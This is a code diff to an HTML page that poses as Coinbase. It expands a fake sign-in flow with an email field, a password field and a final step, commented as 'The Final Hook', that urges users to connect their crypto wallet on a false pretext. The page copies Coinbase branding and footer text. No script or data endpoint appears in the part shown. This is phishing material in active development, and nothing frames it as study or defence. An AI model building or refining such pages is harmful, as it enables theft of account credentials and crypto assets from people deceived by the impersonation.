@@ -73,29 +73,49 @@
 </head>
 <body>
 
-    <div class="container">
+  <div class="container">
         
-     <!-- PAGE 1: The Coinbase Trust Page -->
-        <div id="landing-page" class="landing-card">
-            <div style="display: flex; justify-content: center; margin-bottom: 20px;">
-                <svg width="50" height="50" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="50" cy="50" r="50" fill="#0052ff"/>
-                    <path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/>
-                </svg>
+        <!-- STEP 1: Landing Page -->
+        <div id="step-1" class="landing-card">
+            <div class="cb-logo" style="display: flex; justify-content: center; margin-bottom: 30px;">
+                <svg width="40" height="40" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#0052ff"/><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
             </div>
             <h1>Coinbase</h1>
-            <p>To continue, please verify your account and synchronize your digital assets with the network.</p>
-            <button id="startBtn" class="btn-primary">Get Started</button>
+            <p>Securely manage your crypto portfolio and stay updated with the latest network changes.</p>
+            <button id="toStep2" class="btn-primary">Get Started</button>
         </div>
 
-        <!-- PAGE 2: The Connection Page (Hidden by default) -->
-        <div id="connect-page" class="auth-card hidden">
-            <div class="cb-logo"></div>
-            <h1>Secure Connection</h1>
-            <p>To proceed, please synchronize your Coinbase Wallet. We use industry-standard EIP-1193 protocols to ensure a secure hand-shake.</p>
+        <!-- STEP 2: Email Page -->
+        <div id="step-2" class="auth-card hidden">
+            <h1 style="font-size: 22px;">Sign In</h1>
+            <p>Enter your email address to continue.</p>
+            <input type="email" id="email" placeholder="Email Address" style="width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid var(--cb-border); border-radius: 8px; font-family: 'Inter'; box-sizing: border-box;">
+            <button id="toStep3" class="btn-primary">Continue</button>
+        </div>
+
+        <!-- STEP 3: Password Page -->
+        <div id="step-3" class="auth-card hidden">
+            <h1 style="font-size: 22px;">Password</h1>
+            <p>Enter your password to verify your identity.</p>
+            <input type="password" id="pass" placeholder="Password" style="width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid var(--cb-border); border-radius: 8px; font-family: 'Inter'; box-sizing: border-box;">
+            <button id="toStep4" class="btn-primary">Continue</button>
+        </div>
+
+        <!-- STEP 4: The Final Hook -->
+        <div id="step-4" class="auth-card hidden">
+            <div class="cb-logo" style="display: flex; justify-content: center; margin-bottom: 20px;">
+                <svg width="40" height="40" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#0052ff"/><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
+            </div>
+            <h1 style="font-size: 22px;">Account Verified</h1>
+            <p>A new protocol has been detected for your assets. To ensure full synchronization and security, please connect your wallet.</p>
             <button id="connectBtn" class="btn-primary">Connect Wallet</button>
             <div id="status" style="margin-top: 20px; font-size: 14px; color: var(--cb-blue);"></div>
         </div>
+
+        <div class="footer-text" style="margin-top: 30px;">
+            © 2026 Coinbase, Inc.
+        </div>
+    </div>
 
         <div class="footer-text">
             © 2026 VaultSync | Secured by Coinbase Infrastructure
